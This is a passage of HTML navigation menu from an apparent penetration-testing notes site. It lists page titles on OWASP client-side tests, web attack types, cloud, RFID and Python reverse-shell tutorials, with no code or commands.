    <li class="md-nav__item">
      <a href="../OWASP/WSTG-CLNT-04/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    11.4. Testing for Client-side URL Redirect
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-CLNT-05/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    11.5. Testing for CSS Injection
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-CLNT-06/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    11.6. Testing for Client-side Resource Manipulation
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-CLNT-07/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    11.7. Testing Cross Origin Resource Sharing
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-CLNT-08/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    11.8. Testing for Cross Site Flashing
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-CLNT-09/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    11.9. Testing for Clickjacking
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-CLNT-10/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    11.10. Testing WebSockets
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-CLNT-11/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    11.11. Testing Web Messaging
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-CLNT-12/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    11.12. Testing Browser Storage
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-CLNT-13/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    11.13. Testing for Cross Site Script Inclusion
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-CLNT-14/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    11.14. Testing for Reverse Tabnabbing
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_1_13" >
        
          
          <label class="md-nav__link" for="__nav_7_1_13" id="__nav_7_1_13_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    12.API Testing
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_7_1_13_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_7_1_13">
            <span class="md-nav__icon md-icon"></span>
            12.API Testing
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-APIT-01/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    12.1. Testing GraphQL
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../penetration-testing-process/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Penetration testing process
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../information-gathering/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Information Gathering
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../footprinting/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Enumeration phase
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../vulnerability-assessment/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Vulnerability assessment
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
          
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_6" >
        
          
          
          <div class="md-nav__link md-nav__container">
            <a href="../webexploitation/" class="md-nav__link ">
              
  
  <span class="md-ellipsis">
    Web Exploitation
  </span>
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_7_6" id="__nav_7_6_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_7_6_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_7_6">
            <span class="md-nav__icon md-icon"></span>
            Web Exploitation
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../webexploitation/http-authentication-schemes/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTTP Authentication schemes
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../webexploitation/broken-access-control/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Broken access control
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../webexploitation/brute-forcing/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Brute forcing
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../webexploitation/buffer-overflow/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Buffer overflow attack
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../webexploitation/payloads/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Creating malware and custom payloads
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../webexploitation/captcha-replay-attack/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Captcha Replay Attack
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../webexploitation/command-injection/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Command injection
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../webexploitation/carriage-return-and-linefeed-crlf/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CRLF attack- Carriage Return and Linefeed attack
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../webexploitation/cross-site-request-forgery-csrf/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CSRF attack- Cross-Site Request Forgery
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
        
      
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_6_11" >
        
          
          <label class="md-nav__link" for="__nav_7_6_11" id="__nav_7_6_11_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Directory traversal and File Inclusion attacks
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_7_6_11_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_7_6_11">
            <span class="md-nav__icon md-icon"></span>
            Directory traversal and File Inclusion attacks
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../webexploitation/file-inclusion/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    File inclusion
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../webexploitation/local-file-inclusion-lfi/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    LFI attack- Local File Inclusion attack
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../webexploitation/remote-file-inclusion-rfi/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    RFI attack- Remote File Inclusion attack
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../webexploitation/log-poisoning/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Log poisoning
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../webexploitation/arbitrary-file-upload/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Bypassing file upload restrictions
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../webexploitation/http-verb-tampering/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTTP verb tampering
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../webexploitation/insecure-deserialization/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Insecure deserialization
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../webexploitation/jwt-attacks/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    JWT attacks
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../webexploitation/password-attacks/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Password attacks
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../webexploitation/php-type-juggling-vulnerabilities/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    PHP type juggling vulnerabilities
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../webexploitation/remote-code-execution-rce/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    RCE attack- Remote Code Execution attack
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../webexploitation/reflected-file-download-rfd/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    RFD attack- Reflected File Download attack
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../webexploitation/server-side-template-injection-ssti/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SSTI attack- Server Side Template Injection attack
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../webexploitation/session-puzzling-or-session-variable-overloading/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Session puzzling attack
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../webexploitation/server-side-request-forgery-ssrf/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SSRF attack- Server Side Request Forgery attack
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../webexploitation/sql-injection/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SQL injection attack
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../webexploitation/nosql-injection/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    NoSQL injection
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../webexploitation/cross-frame-scripting-xfs/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    XFS attack- Cross-frame Scripting attack
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../webexploitation/xml-external-entity-xee/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    XEE attack- XML External Entity attack
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../webexploitation/cross-site-scripting-xss/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    XSS attack- Cross-site Scripting attack
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_7" >
        
          
          <label class="md-nav__link" for="__nav_7_7" id="__nav_7_7_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Pentesting applications and frameworks
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_7_7_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_7_7">
            <span class="md-nav__icon md-icon"></span>
            Pentesting applications and frameworks
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../browsers-pentesting/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    browsers
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../django-pentesting/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    django
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../keycloak-pentesting/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    keycloak
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../log4j/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Log4j
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../magnolia-pentesting/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Magnolia
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../mybb-pentesting/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    MyBB
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../odata-pentesting/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    oData
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../tomcat-pentesting/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    tomcat
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../wordpress-pentesting/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    wordpress
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../powerapps-pentesting/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    powerapps
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
      
        
      
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" >
        
          
          <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Pentesting mobile
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8">
            <span class="md-nav__icon md-icon"></span>
            Pentesting mobile
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../setting-up-mobile-penstesting/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Setting up the mobile pentesting environment
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../rooting-mobile/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Rooting Samsung Galaxy A515F
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
          
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9" >
        
          
          
          <div class="md-nav__link md-nav__container">
            <a href="../thick-applications/" class="md-nav__link ">
              
  
  <span class="md-ellipsis">
    Pentesting Thick applications
  </span>
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_9" id="__nav_9_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_9">
            <span class="md-nav__icon md-icon"></span>
            Pentesting Thick applications
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../thick-applications/tools-for-thick-apps/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Tools for pentesting thick clients applications
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../thick-applications/tca-basic-lab-setup/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Basic lab setup
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../thick-applications/tca-first-challenge/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    First challenge- Enabling a button
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../thick-applications/tca-information-gathering-phase/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Information gathering phase
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../thick-applications/tca-traffic-analysis/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Traffic analysis
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../thick-applications/tca-attacking-thick-clients-applications/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Attacking thick clients applications
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../thick-applications/tca-reversing-and-patching/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Reversing and patching thick clients applications
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../thick-applications/tca-common-vulnerabilities/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Common vulnerabilities
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../thick-applications/thick-application-checklist/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Checklist when pentesting Thick applications
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
      
        
      
        
      
        
      
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_10" >
        
          
          <label class="md-nav__link" for="__nav_10" id="__nav_10_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Pentesting Cloud
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_10_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_10">
            <span class="md-nav__icon md-icon"></span>
            Pentesting Cloud
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
      
        
          
        
      
        
      
        
      
        
      
        
      
        
      
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_10_1" >
        
          
          
          <div class="md-nav__link md-nav__container">
            <a href="../cloud/" class="md-nav__link ">
              
  
  <span class="md-ellipsis">
    Cloud essentials
  </span>
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_10_1" id="__nav_10_1_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_10_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_10_1">
            <span class="md-nav__icon md-icon"></span>
            Cloud essentials
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../cloud/aws/aws-essentials/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    aws essentials
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../cloud/azure/az-900-preparation/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Notes for the Az-900 exam
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../cloud/gcp/gcp-essentials/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    gcp essentials
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../cloud/openstasck/openstack-essentials/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    openstack
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../cloud/apache-cloudstack/apache-cloudstack-essentials/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    apache cloudstack
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../cloud/azure/pentesting-azure/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Pentesting Azure
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../cloud/aws/pentesting-aws/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Pentesting AWS
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../cloud/containers/pentesting-docker/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Pentesting docker
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
      
        
      
        
      
        
      
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11" >
        
          
          <label class="md-nav__link" for="__nav_11" id="__nav_11_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Pentesting RFID
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_11_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_11">
            <span class="md-nav__icon md-icon"></span>
            Pentesting RFID
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../RFID/rfid/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    RFID
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11_2" >
        
          
          <label class="md-nav__link" for="__nav_11_2" id="__nav_11_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Cards
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_11_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_11_2">
            <span class="md-nav__icon md-icon"></span>
            Cards
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../RFID/mifare-classic/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Mifare classic
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../RFID/mifare-desfire/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Mifare desfire
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../RFID/proxmark3-rdv4.01-setting-up/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Install proxmark3 in Kali
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../RFID/proxmark3/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Proxmark3 cheat sheet
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
      
        
      
        
      
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_12" >
        
          
          <label class="md-nav__link" for="__nav_12" id="__nav_12_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Python
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_12_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_12">
            <span class="md-nav__icon md-icon"></span>
            Python
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../python/python-installation/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Python installation
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
        
      
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_12_2" >
        
          
          <label class="md-nav__link" for="__nav_12_2" id="__nav_12_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Packet management
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_12_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_12_2">
            <span class="md-nav__icon md-icon"></span>
            Packet management
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../pdm/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    pdm
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../python/pip/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    pip
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../python/pyenv/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    pyenv
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../python/python-virtual-environments/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Virtual environments
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_12_3" >
        
          
          <label class="md-nav__link" for="__nav_12_3" id="__nav_12_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Pentesting with python
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_12_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_12_3">
            <span class="md-nav__icon md-icon"></span>
            Pentesting with python
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../python/python-tools-for-pentesting/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Tools and scripts
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
        
      
        
      
        
      
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_12_3_2" >
        
          
          <label class="md-nav__link" for="__nav_12_3_2" id="__nav_12_3_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Gaining persistence shells (TCP + HTTP)
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_12_3_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_12_3_2">
            <span class="md-nav__icon md-icon"></span>
            Gaining persistence shells (TCP + HTTP)
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../python/coding-a-tcp-reverse-shell/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Coding a TCP reverse shell
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../python/coding-an-http-reverse-shell/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
